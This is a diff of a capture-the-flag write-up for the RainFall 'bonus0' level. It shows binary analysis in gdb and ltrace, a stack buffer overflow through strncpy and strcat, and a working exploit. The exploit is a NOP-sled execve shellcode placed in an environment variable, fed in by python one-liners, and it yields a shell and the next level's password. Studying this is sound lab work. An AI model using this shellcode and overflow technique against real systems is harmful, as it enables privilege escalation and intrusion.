@@ -1,19 +1,16 @@
+* Data Gathering
+#+begin_src shell
 level9@RainFall:~$ su bonus0
 Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
-# first step identify the target
-bonus0@RainFall:~$ ls -lhtr
-total 8.0K
--rwsr-s---+ 1 bonus1 users 5.5K Mar  6  2016 bonus0
-bonus0@RainFall:~$ 
-## detect useful strings
-readelf -p .rodata bonus0
+bonus0@RainFall:~$ readelf -p .rodata bonus0
 String dump of section '.rodata':
   [     8]   - 
   [     c]
--> may need a shellcode
-## detect entry vectors
+#+end_src
+
+#+begin_src shell
 (gdb) info functions
 0x08048380  read@plt -> read from a fd
 0x08048390  strcat@plt -> buffer overflow
@@ -25,34 +22,10 @@ String dump of section '.rodata':
 0x0804851e  pp   -> custom fun 2
 0x080485a4  main -> function
 
-## How to procede with actual info
-Probably need to use a shell code in a buffer using input may stdin or argv.
-look like is using strchr for search '-' char some condition in the logic of the program.
-## let's execute for test
-bonus0@RainFall:~$ ltrace ./bonus0
-__libc_start_main(0x80485a4, 1, 0xbffffd14, 0x80485d0, 0x8048640 <unfinished ...>
-puts(" - " -  -> one use of ' - " is for puts nice.
-read(0, hola -> read stdin
-"hola\n", 4096)                               = 5
-strchr("hola\n", '\n')                                = "\n" -> search newline -> if not newline -> may return NULL but i don't think this would be the vector
-strncpy(0xbffffbf8, "hola", 20)                       = 0xbffffbf8 -> copy until newline
-puts(" - " - 
-)                                           = 4
-### No malloc then info is in the stack -> stack overflow return main function -> to shellcode ?
-## No use strcat may need to input data again ?
-read(0, hola
-"hola\n", 4096)                               = 5 -> 4096 ## Probably the length of the buffer
-strchr("hola\n", '\n')                                = "\n"
-strncpy(0xbffffc0c, "hola", 20)                       = 0xbffffc0c -> why length of 20?
-strcpy(0xbffffc46, "hola")                            = 0xbffffc46
-strcat("hola ", "hola")                               = "hola hola"
-puts("hola hola"hola hola
-)                                     = 10
-+++ exited (status 0) +++
-## Probably add space between the first input and second.
-## end on the second input.
-# let's disass main
-(gdb) set disassembly-flavor intel
+#+end_src
+
+* Binary Analisys.
+  #+begin_src shell
 (gdb) disass main
 Dump of assembler code for function main:
    0x080485a4 <+0>:	push   ebp
@@ -134,10 +107,40 @@ pp
    0x0804851c <+104>:	leave  
    0x0804851d <+105>:	ret    
 End of assembler dump.
-# logic of the program
-main call pp & puts the buffer pass to pp
-pp -> call p two times, strcpy first string to buffer swap '\0', ' ' -> and strcat 2 str
-p -> puts, read, strchr '\n', swap first '\n', '\0', strncpy readbuf, localbuf, 20, strcpy
+
+#+end_src
+# https://dogbolt.org/?id=e155fda2-581f-4305-ad94-25b044fdefd5#BinaryNinja=151&Ghidra=176&Hex-Rays=145
+# using hex of Decompiler online HexRays.
+[[source]]
+* Explotation
+How much
+then pass the shellcode. same as level9 http://shell-storm.org/shellcode/files/shellcode-827.php
+python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"' + 7 * "B" | xxd
+0000000: 4141 4141 4141 4141 41cd ebff bf0a       AAAAAAAAA.....
+####### 
+Not working cause outside the function p the value of her buffer is undefined.
+i will use a shell code as env var
+3973
+NOP + shellcode
+
+export CODE=`/bin/echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
+# let's take the pointer to the env
+(gdb) x/40s *((char **)environ)
+0xbfffff19:	 "CODE=j\vX\231Rh//shh/bin\211\343\061\311Í€"
+# 1 str fill with 20 random not null char
+# 2 str 9 prefix + pointer to env shellcode + suffix to reach 20 B
+bonus0@RainFall:~$  (python -c 'print "A" * 20' ; python -c 'print "A"*9 + "\xbf\xff\xff\x1e"[::-1] + "B" * 7' ; cat) | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿ¿BBBBBBBôý· AAAAAAAAAÿÿ¿BBBBBBBôý·
+ls
+ls: cannot open directory .: Permission denied
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+** detect entry vectors
+
 # logic of the exploit
 strncpy()  Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.
 we could use this to avoid the ' ' in the shellcode.
@@ -152,54 +155,10 @@ AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aaôý· Aa0Aa1Aa2Aa3Aa4Aa5Aaôý· -> puts th
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41336141 in ?? ()
-# it says the offset is of 9 B. -> cause is write it two times maybe could be tricky
+# it says the offset is of 9 B. -> cause is write it two times maybe could be tricky overlap.
 #### I need to get the buffer address to put before offset.
    0x080484d0 <+28>:	lea    eax,[ebp-0x1008] -> buffer
 (gdb) b *p+28
 (gdb) r
 (gdb) p $ebp - 0x1008
 $1 = (void *) 0xbfffeb90 -> buff addr
-#### How to exploit
-fill the first input with NOP '\x90'
-How much
-should overpass to avoid overwrite 40 B of future strcpy first param overflow + ' ' 1 B + 20 B  to avoid overwrite. should be > 61 i will use 62
-then pass the shellcode. same as level9 http://shell-storm.org/shellcode/files/shellcode-827.php
-python -c 'print "\x90" * 62 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x00" * 3973'
-python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' | xxd
-0000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
-0000010: 9090 9090 9090 9090 9090 9090 9090 9090  ................
-0000020: 9090 9090 9090 9090 9090 9090 9090 9090  ................
-0000030: 9090 9090 9090 9090 9090 9090 9090 31c0  ..............1.
-0000040: 5068 2f2f 7368 682f 6269 6e89 e389 c189  Ph//shh/bin.....
-0000050: c2b0 0bcd 8031 c040 cd80 0a              .....1.@...
-##### Warning  shouldn't overflow the buffer. buffer size 4096 B
-4096 - 123
-#### Second string
-offset = 9
-buffer_address + 61 -> nop and shellcode.
-p $ebp - 0x1008 + 61
-$2 = (void *) 0xbfffebcd
-python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"'
-python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"' + 7 * "B" | xxd
-0000000: 4141 4141 4141 4141 41cd ebff bf0a       AAAAAAAAA.....
-####### 
-Not working cause outside the function p the value of her buffer is undefined.
-i will use a shell code as env var
-3973
-NOP + shellcode
-export CODE=`/bin/echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
-# let's take the pointer to the env
-(gdb) x/40s *((char **)environ)
-0xbfffff19:	 "CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311Í€"
-# 1 str fill with 20 random not null char
-# 2 str 9 prefix + pointer to shellcode + suffix to reach 20 B
-bonus0@RainFall:~$  (python -c 'print "A" * 20' ; python -c 'print "A"*9 + "\xbf\xff\xff\x19"[::-1] + "B" * 7' ; cat) | ./bonus0
- - 
- - 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿ¿BBBBBBBôý· AAAAAAAAAÿÿ¿BBBBBBBôý·
-ls
-ls: cannot open directory .: Permission denied
-id
-uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
-cat /home/user/bonus1/.pass
-cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
